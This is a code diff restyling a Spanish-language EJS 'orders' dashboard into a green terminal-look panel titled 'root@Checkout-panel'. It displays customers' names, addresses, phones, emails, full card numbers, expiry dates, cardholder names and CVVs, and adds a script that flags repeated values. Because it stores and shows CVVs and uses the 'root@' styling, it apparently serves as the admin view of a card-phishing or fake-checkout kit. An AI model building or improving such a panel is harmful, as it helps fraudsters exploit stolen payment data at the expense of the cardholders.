@@ -2,54 +2,354 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
-  <title>Dashboard de Pedidos</title>
-  <link rel="stylesheet" href="/css/style.css">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>root@Checkout-panel :: pedidos</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700;800&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #060a06;
+      --bg-panel: #0b120b;
+      --bg-row: #0a100a;
+      --green: #39ff6a;
+      --green-dim: #1c8a3a;
+      --green-faint: #0f4a20;
+      --text: #c9f7d4;
+      --border: #163019;
+      --dup-color: #ffb02e;
+    }
+
+    * { box-sizing: border-box; }
+
+    html, body {
+      margin: 0;
+      min-height: 100%;
+    }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'JetBrains Mono', ui-monospace, 'Courier New', monospace;
+      padding: 20px;
+    }
+
+    .wrap {
+      max-width: 1180px;
+      margin: 0 auto;
+    }
+
+    .terminal {
+      background: var(--bg-panel);
+      border: 1px solid var(--green-faint);
+      border-radius: 6px;
+      box-shadow: 0 0 0 1px rgba(57,255,106,0.05), 0 0 40px rgba(57,255,106,0.08), 0 20px 60px rgba(0,0,0,0.5);
+      overflow: hidden;
+    }
+
+    .titlebar {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 10px 14px;
+      background: var(--bg-row);
+      border-bottom: 1px solid var(--green-faint);
+    }
+
+    .dot { width: 10px; height: 10px; border-radius: 50%; background: var(--green-faint); }
+
+    .titlebar-label {
+      margin-left: 6px;
+      font-size: 12px;
+      letter-spacing: 0.06em;
+      color: var(--green-dim);
+    }
+
+    .logout-form { margin-left: auto; }
+
+    .logout-btn {
+      background: transparent;
+      border: 1px solid var(--green-faint);
+      color: var(--green-dim);
+      font-family: inherit;
+      font-size: 11px;
+      letter-spacing: 0.05em;
+      padding: 5px 10px;
+      border-radius: 3px;
+      cursor: pointer;
+      transition: border-color 0.15s ease, color 0.15s ease;
+    }
+
+    .logout-btn:hover {
+      border-color: var(--green);
+      color: var(--green);
+    }
+
+    .screen {
+      padding: 22px 24px 28px;
+    }
+
+    h1 {
+      font-size: 16px;
+      font-weight: 800;
+      letter-spacing: 0.05em;
+      color: var(--green);
+      margin: 0 0 6px;
+    }
+
+    h1::before {
+      content: "> ";
+      color: var(--green-dim);
+    }
+
+    .stat-line {
+      font-size: 12px;
+      color: var(--green-dim);
+      margin: 0 0 6px;
+    }
+
+    .legend {
+      font-size: 11px;
+      color: var(--green-faint);
+      margin: 0 0 20px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      flex-wrap: wrap;
+    }
+
+    .legend .swatch {
+      display: inline-block;
+      width: 10px;
+      height: 10px;
+      border-radius: 2px;
+      background: var(--dup-color);
+      vertical-align: -1px;
+    }
+
+    .table-wrap {
+      overflow-x: auto;
+      border: 1px solid var(--border);
+      border-radius: 4px;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      min-width: 760px;
+    }
+
+    th, td {
+      padding: 10px 12px;
+      text-align: left;
+      font-size: 12.5px;
+      border-bottom: 1px solid var(--border);
+      white-space: nowrap;
+    }
+
+    th {
+      background: var(--bg-row);
+      color: var(--green-dim);
+      font-size: 10.5px;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      font-weight: 700;
+    }
+
+    tbody tr:hover {
+      background: rgba(57, 255, 106, 0.04);
+    }
+
+    tbody tr:last-child td {
+      border-bottom: none;
+    }
+
+    .dup-tag {
+      display: inline-block;
+      font-size: 9.5px;
+      font-weight: 800;
+      letter-spacing: 0.04em;
+      padding: 1px 6px;
+      border-radius: 3px;
+      margin-left: 8px;
+      background: var(--dup-color);
+      color: #06120a;
+      vertical-align: 1px;
+    }
+
+    td[data-dup="true"] {
+      color: var(--dup-color);
+      font-weight: 700;
+    }
+
+    .empty-state {
+      padding: 40px 20px;
+      text-align: center;
+      color: var(--green-faint);
+      font-size: 13px;
+    }
+
+    .empty-state .cursor {
+      display: inline-block;
+      width: 8px;
+      height: 14px;
+      background: var(--green-dim);
+      vertical-align: -2px;
+      margin-left: 4px;
+      animation: blink 1s step-end infinite;
+    }
+
+    @keyframes blink { 50% { opacity: 0; } }
+
+    @media (max-width: 760px) {
+      .screen { padding: 18px 14px 22px; }
+      .table-wrap { border: none; overflow: visible; }
+      table { min-width: 0; }
+      thead { display: none; }
+      table, tbody, tr, td { display: block; width: 100%; }
+
+      tbody tr {
+        border: 1px solid var(--border);
+        border-radius: 4px;
+        margin-bottom: 12px;
+        padding: 6px 0;
+        background: var(--bg-row);
+      }
+
+      td {
+        white-space: normal;
+        border-bottom: 1px dashed var(--border);
+        padding: 8px 12px;
+        display: flex;
+        justify-content: space-between;
+        gap: 12px;
+        align-items: baseline;
+      }
+
+      td:last-child { border-bottom: none; }
+
+      td::before {
+        content: attr(data-label);
+        font-size: 9.5px;
+        letter-spacing: 0.06em;
+        text-transform: uppercase;
+        color: var(--green-dim);
+        flex-shrink: 0;
+      }
+
+      td span.cell-value {
+        text-align: right;
+        word-break: break-word;
+      }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      .empty-state .cursor { animation: none; }
+    }
+  </style>
 </head>
 <body>
-  <header>
-    <form method="POST" action="/logout" style="float:right;">
-      <button type="submit" style="background:none;border:none;color:#2c6ecb;text-decoration:underline;cursor:pointer;font-size:13px;">
-        Cerrar sesión (<%= username %>)
-      </button>
-    </form>
-    <h1>Pedidos</h1>
-    <p><%= orders.length %> pedido(s).</p>
-  </header>
-  <main>
-    <table>
-      <thead>
-        <tr>
-          <th>Email</th>
-          <th>Nombre</th>
-          <th>Apellidos</th>
-          <th>Dirección</th>
-          <th>Código Postal</th>
-          <th>Ciudad</th>
-          <th>Teléfono</th>
-          <th>N° Tarjeta</th>
-          <th>Vencimiento</th>
-          <th>Titular</th>
-          <th>CVV</th>
-        </tr>
-      </thead>
-      <tbody>
-        <% orders.forEach(function(o) { %>
-          <tr>
-            <td><%= o.contacto?.email ?? '-' %></td>
-            <td><%= o.entrega?.nombre ?? '-' %></td>
-            <td><%= o.entrega?.apellidos ?? '-' %></td>
-            <td><%= o.entrega?.direccion ?? '-' %></td>
-            <td><%= o.entrega?.codigoPostal ?? '-' %></td>
-            <td><%= o.entrega?.ciudad ?? '-' %></td>
-            <td><%= o.entrega?.telefono ?? '-' %></td>
-            <td><%= o.pago?.numeroTarjeta ?? '-' %></td>
-            <td><%= o.pago?.vencimiento ?? '-' %></td>
-            <td><%= o.pago?.titular ?? '-' %></td>
-            <td><%= o.pago?.cvv ?? '-' %></td>
-          </tr>
-        <% }); %>
-      </tbody>
-    </table>
-  </main>
+
+  <div class="wrap">
+    <div class="terminal">
+
+      <div class="titlebar">
+        <span class="dot"></span>
+        <span class="dot"></span>
+        <span class="dot"></span>
+        <span class="titlebar-label">root@Checkout-panel: ~/pedidos</span>
+        <form class="logout-form" method="POST" action="/logout">
+          <button type="submit" class="logout-btn">[ salir · <%= username %> ]</button>
+        </form>
+      </div>
+
+      <div class="screen">
+
+        <h1>PEDIDOS</h1>
+        <p class="stat-line">[OK] <%= orders.length %> registro(s) indexado(s)</p>
+        <p class="legend"><span class="swatch"></span> valor repetido — resaltado automáticamente</p>
+
+        <% if (orders.length === 0) { %>
+
+          <div class="empty-state">
+            [ Sin pedidos registrados todavía<span class="cursor"></span> ]
+          </div>
+
+        <% } else { %>
+
+          <div class="table-wrap">
+            <table id="orders-table">
+              <thead>
+                <tr>
+                  <th>Email</th>
+                  <th>Nombre</th>
+                  <th>Apellidos</th>
+                  <th>Dirección</th>
+                  <th>Código Postal</th>
+                  <th>Ciudad</th>
+                  <th>Teléfono</th>
+                  <th>N° Tarjeta</th>
+                  <th>Vencimiento</th>
+                  <th>Titular</th>
+                  <th>CVV</th>
+                </tr>
+              </thead>
+              <tbody>
+                <% orders.forEach(function(o) { %>
+                  <tr>
+                    <td data-label="Email" data-field="email"><span class="cell-value"><%= o.contacto?.email ?? '-' %></span></td>
+                    <td data-label="Nombre" data-field="nombre"><span class="cell-value"><%= o.entrega?.nombre ?? '-' %></span></td>
+                    <td data-label="Apellidos" data-field="apellidos"><span class="cell-value"><%= o.entrega?.apellidos ?? '-' %></span></td>
+                    <td data-label="Dirección" data-field="direccion"><span class="cell-value"><%= o.entrega?.direccion ?? '-' %></span></td>
+                    <td data-label="Código Postal" data-field="codigoPostal"><span class="cell-value"><%= o.entrega?.codigoPostal ?? '-' %></span></td>
+                    <td data-label="Ciudad" data-field="ciudad"><span class="cell-value"><%= o.entrega?.ciudad ?? '-' %></span></td>
+                    <td data-label="Teléfono" data-field="telefono"><span class="cell-value"><%= o.entrega?.telefono ?? '-' %></span></td>
+                    <td data-label="N° Tarjeta" data-field="numerotarjeta"><span class="cell-value"><%= o.pago?.numeroTarjeta ?? '-' %></span></td>
+                    <td data-label="Vencimiento" data-field="vencimiento"><span class="cell-value"><%= o.pago?.vencimiento ?? '-' %></span></td>
+                    <td data-label="Titular" data-field="titular"><span class="cell-value"><%= o.pago?.titular ?? '-' %></span></td>
+                    <td data-label="CVV" data-field="cvv"><span class="cell-value"><%= o.pago?.cvv ?? '-' %></span></td>
+                  </tr>
+                <% }); %>
+              </tbody>
+            </table>
+          </div>
+
+        <% } %>
+
+      </div>
+    </div>
+  </div>
+
+  <script>
+    (function () {
+      // ======================================================
+      // CONFIGURACIÓN: cambiá este valor para resaltar otro campo.
+      // Opciones válidas: 'email' | 'nombre' | 'apellidos' | 'direccion' | 'codigoPostal' | 'ciudad' | 'telefono'
+      var CAMPO_A_COMPARAR = 'apellidos';
+      // ======================================================
+
+      var cells = document.querySelectorAll('td[data-field="' + CAMPO_A_COMPARAR + '"]');
+      var counts = {};
+
+      cells.forEach(function (cell) {
+        var value = cell.textContent.trim().toLowerCase();
+        if (!value) return;
+        counts[value] = (counts[value] || 0) + 1;
+      });
+
+      cells.forEach(function (cell) {
+        var value = cell.textContent.trim().toLowerCase();
+        if (!value || counts[value] < 2) return;
+
+        cell.setAttribute('data-dup', 'true');
+
+        var tag = document.createElement('span');
+        tag.className = 'dup-tag';
+        tag.textContent = 'x' + counts[value];
+        cell.appendChild(tag);
+      });
+    })();
+  </script>
+
 </body>
 </html>
